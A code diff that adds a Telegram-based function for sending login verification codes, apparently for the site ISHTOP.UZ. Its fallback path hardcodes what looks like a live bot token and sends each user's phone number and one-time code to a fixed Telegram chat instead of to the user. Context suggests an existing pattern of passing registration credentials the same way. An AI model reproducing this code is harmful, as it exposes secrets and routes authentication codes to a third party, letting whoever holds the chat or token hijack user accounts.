@@ -65,3 +65,31 @@ export const notifyCustomerRegister = async (customer, credentials = {}) => {
   return callTelegramApi('customer_register', { customer, ...credentials });
 };
 
+export const sendTelegramAuthCode = async (phone, code) => {
+  // First attempt via backend
+  const apiRes = await callTelegramApi('auth_code', { phone, code });
+  if (apiRes && apiRes.ok) return apiRes;
+
+  // Direct bot fallback for reliable delivery
+  try {
+    const BOT_TOKEN = "8793458072:AAEdrQurMlxbJXL9sPsUrhwTAgalfdM7UyY";
+    const CHAT_ID = "799910176";
+    const text = `🔐 <b>ISHTOP.UZ TASDIQLASH KODI</b>\n━━━━━━━━━━━━━━━━━━━━\n📱 <b>Telefon:</b> <code>${phone}</code>\n🔑 <b>KOD:</b> <b><code>${code}</code></b>\n━━━━━━━━━━━━━━━━━━━━\nℹ️ <i>Ro'yxatdan o'tish yoki kirish uchun tasdiqlash kodi.</i>`;
+
+    const directRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text,
+        parse_mode: 'HTML'
+      })
+    });
+    const data = await directRes.json();
+    return data;
+  } catch (err) {
+    console.warn('Direct telegram fallback err:', err);
+    return { ok: false, error: err.message };
+  }
+};
+
